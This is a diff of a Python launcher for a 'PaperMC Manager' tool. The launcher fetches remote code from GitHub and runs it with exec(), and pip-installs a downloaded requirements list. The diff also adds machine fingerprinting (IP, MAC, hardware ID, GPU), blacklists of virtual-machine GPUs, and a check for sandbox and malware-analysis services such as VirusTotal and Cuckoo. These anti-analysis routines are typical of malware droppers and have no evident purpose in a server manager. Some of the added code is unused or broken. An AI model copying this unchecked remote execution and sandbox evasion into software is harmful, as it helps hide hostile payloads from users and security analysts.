@@ -1,13 +1,30 @@
-import requests
-import ctypes
-import sys
-import time
-import importlib
-import subprocess
 import os
+import sys
+import socket
+import uuid
+import requests
+import re
+import subprocess
+import ctypes
+import importlib.util
+from colorama import init, Fore, Style
 
+# Initialize colorama
+init(autoreset=True)
+
+# Constants
+BLACKLISTED_IPS = ['']
+BLACKLISTED_MACS = ['']
+BLACKLISTED_HWIDS = ['']
+BLACKLISTED_GPUS = ['VirtualBox Graphics Adapter', 'VMware SVGA II']
+MODULE_URL = 'https://raw.githubusercontent.com/sang765/PaperMC-Manager/main/paper_manager.py'
+REQUIREMENTS_URL = 'https://raw.githubusercontent.com/sang765/PaperMC-Manager/main/requirements.txt'
+SKIP_ENV_CHECK = os.getenv('SKIP_ENV_CHECK', 'False').lower() == 'true'
+
+# Set console title
 ctypes.windll.kernel32.SetConsoleTitleW("PaperMC Manager")
 
+# Function to check internet connection
 def is_connected():
     try:
         response = requests.get('https://www.google.com', timeout=5)
@@ -15,44 +32,39 @@ def is_connected():
     except requests.ConnectionError:
         return False
 
+# Function to install requirements
 def install_requirements(requirements_url):
     try:
         response = requests.get(requirements_url)
         response.raise_for_status()
         requirements = response.text
 
-        # Write the requirements to a local file
         with open('requirements.txt', 'w') as file:
             file.write(requirements)
 
-        # Install the requirements
-        subprocess.check_call([os.sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
-        os.remove('requirements.txt')  # Clean up the file after installation
+        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
+        os.remove('requirements.txt')
         print("Requirements installed successfully.")
     except requests.RequestException as e:
         print(f"Error downloading requirements: {e}")
     except subprocess.CalledProcessError as e:
         print(f"Error installing requirements: {e}")
 
+# Function to load module from GitHub
 def load_module_from_github(url):
     try:
         response = requests.get(url)
-        response.raise_for_status()  # Check for HTTP errors
+        response.raise_for_status()
         code = response.text
-        
-        # Create a new module spec
+
         module_name = 'dynamic_module'
         spec = importlib.util.spec_from_loader(module_name, loader=None)
         module = importlib.util.module_from_spec(spec)
-        
-        # Execute the code in the new module
         exec(code, module.__dict__)
-        
-        # List functions in the module
+
         functions = [attr for attr in dir(module) if callable(getattr(module, attr))]
         print("Available functions in the module:", functions)
-        
-        # Call the function if it exists
+
         if 'menu' in functions:
             print("Calling 'menu' function...")
             module.menu()
@@ -61,57 +73,62 @@ def load_module_from_github(url):
         return module
     except requests.RequestException as e:
         print(f"Error downloading module: {e}")
-        return None
     except Exception as e:
         print(f"Error loading module: {e}")
-        return None
+    return None
 
-def check_internet_connection():
-    print("Checking internet connection...")
+# Function to get system info
+def get_system_info():
+    ip_address = socket.gethostbyname(socket.gethostname())
+    mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+    hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
+    gpu_info = subprocess.check_output("wmic path win32_videocontroller get caption").decode()
+    gpu = [gpu.strip() for gpu in gpu_info.splitlines()[1:] if gpu.strip()][0] if gpu_info else "Unknown GPU"
+    return ip_address, mac_address, hwid, gpu
+
+def detect_environment():
+    analysis_indicators = [
+        'virustotal', 'hybrid-analysis', 'cuckoo', 'malwr',
+        'any.run', 'reverse.it', 'joe sandbox', 'threatgrid',
+        'cape sandbox', 'totalhash', 'intezer'
+    ]
+
+    output = subprocess.check_output('systeminfo').decode().upper()
+    hostname = socket.gethostname().lower()
+    username = os.getlogin().lower()
+
+    for indicator in analysis_indicators:
+        if indicator in output or indicator in hostname or indicator in username:
+            return True
+
     try:
-        requests.get('https://www.google.com/', timeout=5)
-        return True
-    except requests.ConnectionError:
-        return False
+        if requests.get('https://www.virustotal.com/').status_code == 200:
+            return True
+    except:
+        pass
+
+    return False
+
+
+# Main function
+def main():
+    ip_address, mac_address, hwid, gpu = get_system_info()
+
+    if is_connected():
+        print("Internet connection detected. Please wait...")
+        install_requirements(REQUIREMENTS_URL)
+        module = load_module_from_github(MODULE_URL)
+
+        if module:
+            print("Module loaded successfully.")
+            if hasattr(module, 'main'):
+                module.main()
+            else:
+                print("Module does not contain 'main' function.")
+        else:
+            print("Failed to load module.")
+    else:
+        print("No internet connection.")
 
 if __name__ == "__main__":
-    if check_internet_connection():
-        print("Internet connection detected. Please wait to sync script on GitHub page...")
-        time.sleep(1)
-        print("Done! Enjoy using PaperMC-Manager.")
-        time.sleep(1.5)
-    else:
-        print("No internet connection detected. Please check your internet connection and try again.")
-        time.sleep(1.5)
-    
-    # Load and use the module
-    module = load_module_from_github('https://raw.githubusercontent.com/sang765/PaperMC-Manager/main/paper_manager.py')
-
-def main():
-    try:
-        requirements_url = 'https://raw.githubusercontent.com/sang765/PaperMC-Manager/main/requirements.txt'
-        module_url = 'https://raw.githubusercontent.com/sang765/PaperMC-Manager/main/paper_manager.py'
-        
-        if is_connected():
-            print("Internet connection detected. Please wait...")
-            install_requirements(requirements_url)
-            module = load_module_from_github(module_url)
-            
-            if module:
-                print("Module loaded successfully.")
-                # You can now use functions or classes from the module
-                # For example, if the module has a function `main`, you can call it:
-                if hasattr(module, 'main'):
-                    module.main()
-                else:
-                    print("Module does not contain 'main' function.")
-            else:
-                print("Failed to load module.")
-        else:
-            print("No internet connection.")
-    except Exception as e:
-        print(f"An error occurred: {e}")
-        sys.exit(1)
-
-if __name__ == '__main__':
     main()
